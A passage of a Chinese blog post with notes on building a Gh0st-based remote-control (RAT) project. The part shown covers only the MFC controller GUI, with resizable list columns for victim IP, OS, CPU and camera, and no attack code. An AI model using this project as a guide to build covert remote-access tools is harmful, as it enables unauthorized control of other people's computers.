<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>基于Gh0st的远控项目笔记 | The_Itach1</title><meta name="keywords" content="Windows,编程开发"><meta name="author" content="The_Itach1"><meta name="copyright" content="The_Itach1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="基于Gh0st的远控项目笔记花了些时间来完成的一个项目，大部分功能都实现了，并且修改了小部分东西。 教程挺老了，但是整体代码的框架是很牛逼的，虽然大部分都是直接搬教程的代码，但是整体流程走下来还是学到很多东西。 完成后的github链接：https:&#x2F;&#x2F;github.com&#x2F;The-Itach1&#x2F;MyGh0st part1-环境配置VS环境配置需要下面两个配置，主要用于MFC项目。 创建MFC对话">
<meta property="og:type" content="article">
<meta property="og:title" content="基于Gh0st的远控项目笔记">
<meta property="og:url" content="http://example.com/2022/08/10/%E5%9F%BA%E4%BA%8EGh0st%E7%9A%84%E8%BF%9C%E6%8E%A7%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="The_Itach1">
<meta property="og:description" content="基于Gh0st的远控项目笔记花了些时间来完成的一个项目，大部分功能都实现了，并且修改了小部分东西。 教程挺老了，但是整体代码的框架是很牛逼的，虽然大部分都是直接搬教程的代码，但是整体流程走下来还是学到很多东西。 完成后的github链接：https:&#x2F;&#x2F;github.com&#x2F;The-Itach1&#x2F;MyGh0st part1-环境配置VS环境配置需要下面两个配置，主要用于MFC项目。 创建MFC对话">
<meta property="og:locale" content="zh_CH">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2022-08-10T09:38:45.000Z">
<meta property="article:modified_time" content="2023-02-09T18:51:53.934Z">
<meta property="article:author" content="The_Itach1">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="编程开发">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/2.png"><link rel="canonical" href="http://example.com/2022/08/10/%E5%9F%BA%E4%BA%8EGh0st%E7%9A%84%E8%BF%9C%E6%8E%A7%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-02-10 02:51:53'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/5.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">64</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> music</span></a></li><li><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> Gallery</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> movies</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">The_Itach1</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> music</span></a></li><li><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> Gallery</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> movies</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">基于Gh0st的远控项目笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-08-10T09:38:45.000Z" title="Created 2022-08-10 17:38:45">2022-08-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-02-09T18:51:53.934Z" title="Updated 2023-02-10 02:51:53">2023-02-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BC%96%E7%A8%8Blearning/">编程learning</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="基于Gh0st的远控项目笔记"><a href="#基于Gh0st的远控项目笔记" class="headerlink" title="基于Gh0st的远控项目笔记"></a>基于Gh0st的远控项目笔记</h1><p>花了些时间来完成的一个项目，大部分功能都实现了，并且修改了小部分东西。</p>
<p>教程挺老了，但是整体代码的框架是很牛逼的，虽然大部分都是直接搬教程的代码，但是整体流程走下来还是学到很多东西。</p>
<p>完成后的github链接：<a target="_blank" rel="noopener" href="https://github.com/The-Itach1/MyGh0st">https://github.com/The-Itach1/MyGh0st</a></p>
<h2 id="part1-环境配置"><a href="#part1-环境配置" class="headerlink" title="part1-环境配置"></a>part1-环境配置</h2><h3 id="VS环境配置"><a href="#VS环境配置" class="headerlink" title="VS环境配置"></a>VS环境配置</h3><p>需要下面两个配置，主要用于MFC项目。<br><img src="https://s2.loli.net/2022/04/06/sKrbZ1mzO65uF8f.png"></p>
<h3 id="创建MFC对话框程序"><a href="#创建MFC对话框程序" class="headerlink" title="创建MFC对话框程序"></a>创建MFC对话框程序</h3><p>创建MFC应用程序，基于对话框，在静态库中使用MFC。<br><img src="https://s2.loli.net/2022/04/06/xdw7Q9286HvlcjR.png"><br>然后属性选择多字符集。</p>
<h2 id="part2-客户端界面的设计和编写"><a href="#part2-客户端界面的设计和编写" class="headerlink" title="part2-客户端界面的设计和编写"></a>part2-客户端界面的设计和编写</h2><h3 id="添加两个List-Control"><a href="#添加两个List-Control" class="headerlink" title="添加两个List Control"></a>添加两个List Control</h3><p>先删除原窗口自带的一些控件，然后调整主窗口的大小，并且添加最大化，最小化功能。</p>
<p>删除原有控件Del就行，最大化和最小化主窗口，设置Maxximize Box和Minximize Box。</p>
<p>使用工具栏添加两个List Control，主要解决的问题是如何让两个控件跟着主窗口的缩放而缩放。</p>
<p>方法是采用OnSize，对主窗口设置一个针对于WM_SIZE的消息处理函数OnSize，这样就可以获得窗口变换时的长宽，然后再根据偏移设置两个控件的大小。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::OnSize</span><span class="params">(UINT nType, <span class="keyword">int</span> cx, <span class="keyword">int</span> cy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//用于窗口重绘，当WM_SIZE消息触发，就会进入此函数，然后传入主窗口的信息cx和cy，分别代表宽度和高度。</span></span><br><span class="line">	CDialogEx::OnSize(nType, cx, cy);</span><br><span class="line"></span><br><span class="line">	 <span class="comment">//<span class="doctag">TODO:</span> 在此处添加消息处理程序代码</span></span><br><span class="line">	<span class="keyword">if</span> (m_CList_Online.m_hWnd != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//CRect 有很多内置函数，矩阵的坐标</span></span><br><span class="line">		CRect rc;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//基于主窗口的宽高度变换，修改List Control控件的矩阵大小。</span></span><br><span class="line">		rc.left = <span class="number">1</span>;       <span class="comment">//列表的左坐标</span></span><br><span class="line">		rc.top = <span class="number">90</span>;       <span class="comment">//列表的上坐标</span></span><br><span class="line">		rc.right = cx - <span class="number">1</span>;  <span class="comment">//列表的右坐标</span></span><br><span class="line">		rc.bottom = cy - <span class="number">200</span>;  <span class="comment">//列表的下坐标</span></span><br><span class="line">		<span class="comment">//重置列表控件的窗口大小</span></span><br><span class="line">		m_CList_Online.MoveWindow(rc);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//同上</span></span><br><span class="line">	<span class="keyword">if</span> (m_CList_Message.m_hWnd != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CRect rc;</span><br><span class="line">		rc.left = <span class="number">1</span>;        <span class="comment">//列表的左坐标</span></span><br><span class="line">		rc.top = cy - <span class="number">196</span>;    <span class="comment">//列表的上坐标</span></span><br><span class="line">		rc.right = cx - <span class="number">1</span>;    <span class="comment">//列表的右坐标</span></span><br><span class="line">		rc.bottom = cy - <span class="number">20</span>;  <span class="comment">//列表的下坐标</span></span><br><span class="line">		m_CList_Message.MoveWindow(rc);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来还有一个小问题，就是在未变动窗口时，可能控件的位置不是太理想，这时候可以采取窗口初始化，也就是在BOOL CMyRemoteDlg::OnInitDialog()里面加入对主窗口初始化的代码，然后就也会触发WM_SIZE事件，然后进入OnSize函数，也对控件进行初始化</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//先初始化主窗口一次，这样也会触发WM_SIZE事件。</span></span><br><span class="line">CRect crect;</span><br><span class="line">GetWindowRect(&amp;crect);</span><br><span class="line">crect.bottom += <span class="number">20</span>;</span><br><span class="line">MoveWindow(crect);</span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br></pre></td></tr></table></figure>

<p>阶段成品样子<br><img src="https://s2.loli.net/2022/04/07/WDbGNnwKC4mMiT2.png"></p>
<h3 id="给列表添加变量"><a href="#给列表添加变量" class="headerlink" title="给列表添加变量"></a>给列表添加变量</h3><p>这部分主要是添加报表，类似于表格，两个列表控件添加的报表不同，但是操作一样。</p>
<p>首先修改两个列表控件的view属性为Report。</p>
<p>然后我们需要先思考好每个列表控件需要添加什么列名。</p>
<pre><code>第一个控件：0IP 1所在区域   2计算机名/备注  3操作系统  4CPU  5摄像头  6Ping

第二个控件：0信息类型 1时间 2信息内容</code></pre>
<p>使用列表控件的类函数添加新列，<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/mfc/reference/clistctrl-class?view=msvc-170#insertcolumn">CListCtrl::InsertColumn</a></p>
<pre><code>int InsertColumn(
    int nCol,
    const LVCOLUMN* pColumn);

int InsertColumn(
    int nCol,  //新列的索引。
    LPCTSTR lpszColumnHeading, //包含列标题的字符串的地址。
    int nFormat = LVCFMT_LEFT,  //整数，用于指定列的对齐方式。 可以是以下值之一： LVCFMT_LEFT 、 LVCFMT_RIGHT 或 LVCFMT_CENTER 。
    int nWidth = -1, //列的宽度（以像素为单位）。 如果此参数为-1，则不设置列宽。
    int nSubItem = -1);  //与该列关联的子项的索引。 如果此参数为-1，则没有子项与该列关联。</code></pre>
<p>然后为了方便我们编写代码，我们构造一个结构体来保存列的部分数据</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//定义一种结构体，储存列的名称和宽度</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span>* title;           <span class="comment">//列表的名称</span></span><br><span class="line">	<span class="keyword">int</span>		nWidth;   <span class="comment">//列表的宽度</span></span><br><span class="line">&#125;COLUMNSTRUCT;</span><br></pre></td></tr></table></figure>

<p>然后就是给数据，具体宽度根据自己的界面设计来定。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//初始化列数据</span></span><br><span class="line">COLUMNSTRUCT Array_Column_Online[] = &#123;</span><br><span class="line">	&#123;<span class="string">&quot;IP&quot;</span>,				<span class="number">225</span>	&#125;,</span><br><span class="line">	&#123;<span class="string">&quot;区域&quot;</span>,			<span class="number">200</span>	&#125;,</span><br><span class="line">	&#123;<span class="string">&quot;计算机名/备注&quot;</span>,	<span class="number">200</span>	&#125;,</span><br><span class="line">	&#123;<span class="string">&quot;操作系统&quot;</span>,		<span class="number">200</span>	&#125;,</span><br><span class="line">	&#123;<span class="string">&quot;CPU&quot;</span>,				<span class="number">150</span>	&#125;,</span><br><span class="line">	&#123;<span class="string">&quot;摄像头&quot;</span>,			<span class="number">150</span>	&#125;,</span><br><span class="line">	&#123;<span class="string">&quot;PING&quot;</span>,			<span class="number">150</span>	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">COLUMNSTRUCT Array_Column_Message[] = &#123;</span><br><span class="line">	&#123;<span class="string">&quot;信息类型&quot;</span>,		<span class="number">200</span>	&#125;,</span><br><span class="line">	&#123;<span class="string">&quot;时间&quot;</span>,			<span class="number">400</span>	&#125;,</span><br><span class="line">	&#123;<span class="string">&quot;信息内容&quot;</span>,	    <span class="number">675</span>	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//两个列数据的长度</span></span><br><span class="line"><span class="keyword">int</span> Array_Column_Online_lenth = <span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> Array_Column_Message_lenth = <span class="number">3</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后使用InsertColumn进行插入新列。这里单独创建一个函数来干这件事。视图-&gt;类视图-&gt;选择类-&gt;添加-&gt;添加函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CMyRemoteDlg::InitList</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//使用InsertColumn插入列,满足左对齐</span></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Array_Column_Online_lenth; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		m_CList_Online.InsertColumn(i, Array_Column_Online[i].title, LVCFMT_CENTER, Array_Column_Online[i].nWidth);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Array_Column_Message_lenth; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		m_CList_Message.InsertColumn(i, Array_Column_Message[i].title, LVCFMT_CENTER, Array_Column_Message[i].nWidth);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>阶段成品展示。<br><img src="https://s2.loli.net/2022/04/07/iVao9g7hc1nm3AQ.png"></p>
<h3 id="让列表的列能随窗口的变化而变化"><a href="#让列表的列能随窗口的变化而变化" class="headerlink" title="让列表的列能随窗口的变化而变化"></a>让列表的列能随窗口的变化而变化</h3><p>之前我们完成的代码，每一列的宽度不能随主窗口的变化而变化，这一节就是来解决这个问题。</p>
<p>同样主窗口变化的事件还是WM_SIZE，所以我们还是在OnSize函数中对列宽进行操作，需要用到<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/mfc/reference/clistctrl-class?view=msvc-170#setcolumnwidth">SetColumnWidth</a>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetColumnWidth</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> nCol,  <span class="comment">//要为其设置宽度的列的索引。 在列表视图中，此参数必须为0。</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> cx)</span></span>;  <span class="comment">//列的新宽度。</span></span><br></pre></td></tr></table></figure>
<p>所以我们只需要求出列的新宽度即可，也就是（列原长度/列原总长度）* 新主窗口宽度。一个简单的数学问题。</p>
<p>先定义两个变量储存列原总长度。</p>
<pre><code>//初始化列的总长度
int Column_Online_lenth = 0;
int Column_Message_lenth = 0;</code></pre>
<p>然后在initlist中，利用for循环求出两个变量的具体值。</p>
<p>然后在onsize中进行计算修改，需要注意的点是，for循环需要包含在if条件中，也就是当这个窗口的句柄不为0，即列表窗口存在时才进行此操作。如果放在if外，会先执行OnSize函数，然后由于宽度为0，造成除0异常。还有一点就是需要用double计算，因为c语言中的除法只会取整，造成很大的误差。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::OnSize</span><span class="params">(UINT nType, <span class="keyword">int</span> cx, <span class="keyword">int</span> cy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//用于窗口重绘，当WM_SIZE消息触发，就会进入此函数，然后传入主窗口的信息cx和cy，分别代表宽度和高度。</span></span><br><span class="line">	CDialogEx::OnSize(nType, cx, cy);</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//主窗口减去两边留下的一点空隙</span></span><br><span class="line">	<span class="keyword">double</span> dcx = cx<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">	 <span class="comment">//<span class="doctag">TODO:</span> 在此处添加消息处理程序代码</span></span><br><span class="line">	<span class="keyword">if</span> (m_CList_Online.m_hWnd != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//CRect 有很多内置函数，矩阵的坐标</span></span><br><span class="line">		CRect rc;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//基于主窗口的宽高度变换，修改List Control控件的矩阵大小。</span></span><br><span class="line">		rc.left = <span class="number">1</span>;       <span class="comment">//列表的左坐标</span></span><br><span class="line">		rc.top = <span class="number">90</span>;       <span class="comment">//列表的上坐标</span></span><br><span class="line">		rc.right = cx - <span class="number">1</span>;  <span class="comment">//列表的右坐标</span></span><br><span class="line">		rc.bottom = cy - <span class="number">200</span>;  <span class="comment">//列表的下坐标</span></span><br><span class="line">		<span class="comment">//重置列表控件的窗口大小</span></span><br><span class="line">		m_CList_Online.MoveWindow(rc);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//让每一列的宽度随主窗口的宽度而变化。</span></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Array_Column_Online_nums; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">double</span> dd = Array_Column_Online[i].nWidth;     <span class="comment">//得到当前列的宽度</span></span><br><span class="line">			dd /= Column_Online_lenth;                    <span class="comment">//看一看当前宽度占总长度的几分之几</span></span><br><span class="line">			dd *= dcx;                                       <span class="comment">//用原来的长度乘以所占的几分之几得到当前的宽度</span></span><br><span class="line">			<span class="keyword">int</span> NewWidth = (<span class="keyword">int</span>)dd;                                   <span class="comment">//转换为int 类型</span></span><br><span class="line">			m_CList_Online.SetColumnWidth(i, NewWidth);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//同上</span></span><br><span class="line">	<span class="keyword">if</span> (m_CList_Message.m_hWnd != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CRect rc;</span><br><span class="line">		rc.left = <span class="number">1</span>;        <span class="comment">//列表的左坐标</span></span><br><span class="line">		rc.top = cy - <span class="number">196</span>;    <span class="comment">//列表的上坐标</span></span><br><span class="line">		rc.right = cx - <span class="number">1</span>;    <span class="comment">//列表的右坐标</span></span><br><span class="line">		rc.bottom = cy - <span class="number">20</span>;  <span class="comment">//列表的下坐标</span></span><br><span class="line">		m_CList_Message.MoveWindow(rc);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//让每一列的宽度随主窗口的宽度而变化。</span></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Array_Column_Message_nums; i++)</span><br><span class="line">		